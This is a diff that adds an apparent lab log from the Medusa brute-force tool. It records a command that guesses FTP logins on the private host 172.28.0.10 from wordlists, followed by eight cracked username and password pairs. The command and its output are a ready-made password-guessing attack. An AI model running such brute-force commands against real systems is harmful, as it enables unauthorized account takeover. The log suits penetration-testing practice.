@@ -1,0 +1,11 @@
+# Medusa v.2.3 (2026-10-29 18:00:38)
+# medusa -h 172.28.0.10 -U /wordlists/trial1-users.txt -P /wordlists/trial1-passwords.txt -M ftp -t 4 -g 10 -v 4 -O /logs/medusa-ftp-20261029-150038.log 
+2026-10-29 18:02:11 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: admin Password: 74lg [SUCCESS]
+2026-10-29 18:04:02 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: administrator Password: 52jk [SUCCESS]
+2026-10-29 18:08:38 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: user Password: 36jw [SUCCESS]
+2026-10-29 18:11:41 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: test Password: 90jc [SUCCESS]
+2026-10-29 18:14:43 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: guest Password: 90py [SUCCESS]
+2026-10-29 18:15:05 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: support Password: 10ny [SUCCESS]
+2026-10-29 18:15:29 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: backup Password: 12ab [SUCCESS]
+2026-10-29 18:18:06 ACCOUNT FOUND: [ftp] Host: 172.28.0.10 User: adm Password: 76tu [SUCCESS]
+# Medusa has finished (2026-10-29 18:18:06).
